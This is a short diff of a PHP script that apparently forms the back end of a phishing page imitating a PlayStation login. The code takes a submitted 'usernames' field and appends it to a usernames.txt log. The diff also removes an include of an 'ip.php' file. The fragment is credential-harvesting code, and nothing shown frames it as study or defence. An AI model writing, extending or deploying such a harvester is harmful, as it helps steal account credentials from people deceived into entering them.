@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "PlayStation username : " . $email = $_POST['usernames'] . "\n", FILE_APPEND);
 ?>
 <?php
